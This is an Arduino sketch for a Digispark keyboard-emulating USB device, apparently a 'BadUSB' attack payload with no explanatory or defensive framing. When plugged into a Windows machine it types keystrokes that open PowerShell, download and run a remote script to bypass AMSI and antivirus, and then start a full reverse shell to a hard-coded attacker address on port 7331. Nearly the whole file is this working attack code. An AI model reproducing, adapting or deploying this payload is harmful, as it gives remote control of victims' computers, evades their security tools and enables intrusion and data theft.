
#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
void setup() {
  // put your setup code here, to run once:
  pinMode(1, OUTPUT); //LED on Model A
}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell.exe");//start PowerShell
  //DigiKeyboard.print("powershell.exe -noexit -command \"mode con cols=18 lines=1\"");//start tiny PowerShell
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.delay(2000);
  DigiKeyboard.println(F("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1'); Invoke-AlokS-AvBypass")); //amsi bypass
  DigiKeyboard.delay(12000);
  DigiKeyboard.println(F("$client = New-Object System.Net.Sockets.TCPClient('192.168.19.160',7331);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")); //powershell to attacker
  DigiKeyboard.delay(5000);
  //DigiKeyboard.print("powershell.exe -window minimized");//start tiny PowerShell
  //DigiKeyboard.delay(2000);
  //DigiKeyboard.sendKeyStroke(KEY_ENTER); //run

  DigiKeyboard.delay(5000);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
